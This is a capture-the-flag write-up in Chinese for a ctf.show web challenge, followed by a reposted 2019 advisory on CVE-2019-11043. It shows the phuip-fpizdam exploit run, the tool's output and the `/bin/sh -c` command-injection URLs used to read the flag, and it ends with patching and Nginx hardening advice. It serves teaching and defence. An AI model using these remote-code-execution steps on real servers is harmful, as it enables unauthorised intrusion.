- 题如其名，没啥代码，其实侧面暗示此题和代码无关。
- 既然和代码无关，那就只能和[nginx](https://cn-sec.com/archives/tag/nginx)或者php有关了

✦ 要检查网站的服务器版本信息，可以使用以下几种方法：

   1. 使用curl命令查看响应头：
   1    curl -I
     https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/

   2. 使用浏览器开发者工具：
      - 打开浏览器的开发者工具（F12）
      - 切换到"Network"（网络）选项卡
      - 刷新页面
      - 点击获取的请求，查看"Headers"（响应头）部分

   3. 使用在线工具：
      - 使用在线HTTP头检查工具
      - 使用网站信息收集工具如whatweb、wappalyzer等

   4. 使用nmap扫描：
   1    nmap -sV e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show

  从我们之前的测试中，我们已经知道该网站使用的是：
   - 服务器：nginx/1.20.1
   - PHP版本：PHP/7.1.33dev

在网上搜索相关漏洞 最为贴近的是CVE-2019-11043 利用工具：PHuiP-FPizdaM
于是网上找到现成工具 `git clone https://github.com/neex/phuip-fpizdam.git`

`https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php?a=ls`
```
fl0gHe1e.txt index.php <?php
highlight_file(__FILE__);
?>
```
获得关键文件 fl0gHe1e.txt
构造`https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php?a=cat+fl0gHe1e.txt`
得到`ctfshow{1fcebdf2-4866-4a6c-8bd9-a76cae9bdb4e}`


-----

# CVE-2019-11043漏洞利用详细过程记录

## 1. 目标信息收集

### 1.1 初始探测
首先，我们对目标网站进行基本探测，获取服务器信息：
```bash
curl -I https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/
```

返回的响应头显示：
```
Server: nginx/1.20.1
X-Powered-By: PHP/7.1.33dev
```

### 1.2 网站内容分析
访问网站首页显示PHP源代码：
```php
<?php
highlight_file(__FILE__);
?>
```

这表明服务器使用`highlight_file(__FILE__)`显示当前文件内容，且不处理任何参数。

## 2. 漏洞识别与分析

### 2.1 版本信息分析
通过响应头我们获得了关键信息：
- Nginx版本：1.20.1
- PHP版本：7.1.33dev

### 2.2 CVE漏洞搜索
基于这些版本信息，我们进行CVE漏洞搜索：
```bash
# 搜索nginx 1.20.1相关漏洞
searchsploit nginx 1.20.1

# 搜索PHP 7.1.33dev相关漏洞
searchsploit PHP 7.1.33
```

通过网络搜索确认：
- PHP 7.1.33dev版本受CVE-2019-11043漏洞影响
- 该漏洞影响PHP 7.1.x版本（小于7.1.33）的版本

### 2.3 漏洞原理
CVE-2019-11043是一个PHP远程代码执行漏洞，由Wallarm安全研究员Andrew Danau在CTF比赛中发现。该漏洞需要以下条件：
1. 漏洞版本的PHP（7.1.33dev符合条件）
2. Nginx服务器（1.20.1版本）
3. 启用PHP-FPM

漏洞原理是PHP-FPM与Nginx配合时的边界情况，允许攻击者通过发送特制请求来执行远程代码。

## 3. 漏洞利用准备

### 3.1 工具获取
我们使用专门针对此漏洞的利用工具phuip-fpizdam：
```bash
git clone https://github.com/neex/phuip-fpizdam.git
cd phuip-fpizdam
go build
```

### 3.2 环境检查
确认Go语言环境：
```bash
go version
# 输出: go version go1.25.1 darwin/arm64
```

## 4. 漏洞利用过程

### 4.1 初步检测
运行工具检测目标是否易受攻击：
```bash
./phuip-fpizdam https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php
```

工具输出显示：
```
Base status code is 200
Status code 502 for qsl=1765, adding as a candidate
The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
Attack params found: --qsl 1755 --pisos 189 --skip-detect
Performing attack using php.ini settings...
Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
```

这表明目标确实存在漏洞，并且可以执行命令。

### 4.2 遇到的问题及解决方法
#### 问题1：直接使用curl命令无法执行
尝试直接使用curl命令时：
```bash
curl -s "https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php?a=id"
```

返回的仍然是PHP源代码，而不是命令执行结果。

#### 解决方法：
根据工具的输出，需要使用特定的参数组合和命令格式：
```
?a=/bin/sh+-c+'[命令]'&
```

其中给的url链接必须是.php文件为后缀才能正常执行命令

#### 问题2：命令执行结果不明显
某些命令执行后，结果可能被PHP代码覆盖或不易识别。

#### 解决方法：
使用base64编码输出结果，使其更明显：
```bash
curl -s "https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php?a=/bin/sh+-c+'ls+-la+/|+base64'&"
```

### 4.3 寻找flag文件
使用命令列出根目录文件：
```bash
curl -s "https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php?a=ls"
```

发现了一个可疑文件：`fl0gHe1e.txt`

### 4.4 读取flag文件
使用命令读取flag文件内容：
```bash
curl -s "https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php?a=/bin/sh+-c+'cat+fl0gHe1e.txt'"
```

成功获取到flag：
```
ctfshow{1fcebdf2-4866-4a6c-8bd9-a76cae9bdb4e}
```

## 5. 漏洞利用细节

### 5.1 攻击参数
工具检测到的有效攻击参数：
- `--qsl 1755`
- `--pisos 189`
- `--skip-detect`

### 5.2 命令执行格式
成功执行命令的格式：
```
?a=/bin/sh+-c+'[命令]'&
```

例如：
- 列出目录：`?a=/bin/sh+-c+'ls'&`
- 读取文件：`?a=/bin/sh+-c+'cat+[文件名]'&`
- 查找文件：`?a=/bin/sh+-c+'find+/+-name+[模式]'&`

## 6. 防护建议

### 6.1 升级PHP版本
升级到不受此漏洞影响的版本：
- PHP 7.2.24或更高版本
- PHP 7.3.11或更高版本

### 6.2 配置检查
检查Nginx配置，避免不安全的配置：
```
location ~ [^/]\.php(/|$) {
    fastcgi_split_path_info ^(.+?\.php)(/.*)$;
    if (!-f $document_root$fastcgi_script_name) {
        return 404;
    }
    fastcgi_pass php:9000;
    fastcgi_index index.php;
    include fastcgi_params;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
}
```

### 6.3 安全监控
- 定期更新和修补服务器软件
- 监控异常的HTTP请求模式
- 使用WAF（Web应用防火墙）检测和阻止恶意请求

## 7. 总结

本次攻击成功利用了CVE-2019-11043漏洞，通过以下步骤获取了flag：
1. 信息收集识别出易受攻击的PHP版本
2. 使用专用工具确认漏洞存在
3. 构造特定格式的请求执行命令
4. 查找并读取flag文件

此漏洞提醒我们及时更新软件版本和检查配置安全的重要性。

-----

PHP远程代码执行漏洞预警（CVE-2019-11043）

[](https://www.freebuf.com/articles/web/217836.html)2019-11-05 10:00:20

**在2019年9月26日，PHP官方发布了一则漏洞公告，此次漏洞公告中官方披露了一个远程代码执行漏洞，该漏洞是因PHP-FPM中的fpm_main.c文件的env_path_info下溢而导致的。该漏洞存在于PHP-FPM + Nginx组合使用并采用一定配置的情况下。该漏洞PoC已在2019年10月22日公布，PHP与Nginx组合使用的情况较为广泛，攻击者可利用该漏洞远程执行任意代码，所以危害性较大。**

## PHP-FPM组件介绍

PHP-FPM（FastCGI流程管理器）是另一种PHP FastCGI实现，具有一些其他功能，可用于各种规模的站点，尤其是繁忙的站点。

对于PHP 5.3.3之前的php来说，PHP-FPM是一个补丁包，旨在将FastCGI进程管理整合进PHP包中。如果你使用的是PHP 5.3.3之前的PHP的话，就必须将它patch到你的PHP源代码中，在编译安装PHP后才可以使用。而PHP 5.3.3已经集成php-fpm了，不再是第三方的包了。PHP-FPM提供了更好的PHP[进程管理](https://baike.baidu.com/item/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86)方式，可以有效控制内存和进程、可以平滑[重载](https://baike.baidu.com/item/%E9%87%8D%E8%BD%BD)PHP配置。

## 漏洞描述

该漏洞是PHP-FPM中的fpm_main.c文件的env_path_info下溢导致，在sapi/fpm/fpm/fpm_main.c文件中的第1140行包含pointer arithmetics，这些pointer arithmetics假定env_path_info的前缀等于php脚本的路径。但是，代码不会检查这些假设是否被满足，缺少检查会导致”path_info”变量中的指针无效。

这样的条件可以在标准的Nginx配置中实现。如果有这样的Nginx配置：

攻击者可以使用换行符（编码格式为％0a）来破坏`fastcgi_split_path_info`指令中的regexp。regexp损坏将导致空PATH_INFO，从而触发该错误。

这个错误会导致代码执行漏洞。在后面的代码中，path_info[0]的值设置为0，然后再调用FCGI_PUTENV。攻击者可以使用精心选择的URL路径长度和查询字符串，使path_info精确地指向_fcgi_data_seg结构的第一个字节。然后将0放入其中则‘char* pos’字段向后移动，然后FCGI_PUTENV使用脚本路径覆盖一些数据(包括其他快速cgi变量)。使用这种技术，攻击者可以创建一个伪PHP_VALUE fcgi变量，然后使用一系列精心选择的配置值来执行代码。

## 影响产品：

> 在2019-09-26更新之前下载的PHP-FPM，且必须为Nginx + php-fpm 的服务器使用如下配置，会受到影响。

## 深信服解决方案

> 深信服下一代防火墙可防御此漏洞， 建议部署深信服下一代防火墙的用户开启安全防御模块，可轻松抵御此高危风险。
> 
> 深信服云盾已第一时间从云端自动更新防护规则，云盾用户无需操作，即可轻松、快速防御此高危风险。

## 修复建议

> 1.如果业务不需要以下配置，建议用户删除：
> 
> 2.使用github中的最新的PHP版本，下载地址：
> 
> [https://github.com/php/php-src](https://github.com/php/php-src)

## 参考链接

> [https://bugs.php.net/bug.php?id=78599](https://bugs.php.net/bug.php?id=78599)

***本文作者：深信服千里目安全实验室，转载请注明来自FreeBuf.COM**